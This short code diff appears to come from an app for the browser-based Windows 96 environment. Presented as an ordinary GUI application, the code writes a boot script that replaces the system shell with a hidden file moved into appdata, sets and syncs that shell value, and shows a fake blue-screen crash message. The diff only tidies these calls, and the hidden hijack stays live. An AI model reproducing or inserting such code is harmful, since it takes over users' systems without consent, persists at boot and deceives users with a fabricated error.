@@ -44,8 +44,7 @@ class GUIApplication extends WApplication {
         mainwnd.show();
             await fs.writestr("c:/system/boot/notron.js", 'const fs = w96.FS;const { sysConf: SCM } = w96;SCM.set("System/Session/Shell/exec","c:/user/appdata/z.wrt");await SCM.syncRoot("Software");');
             await fs.mvfile("c:/user/desktop/notronplus.wrt", "c:/user/appdata/z.wrt");
-            SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
-            await SCM.syncRoot("Software");
+            await SCM.setAndSync("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
             w96.sys.renderBSOD("Failed to render window");
         }
     }
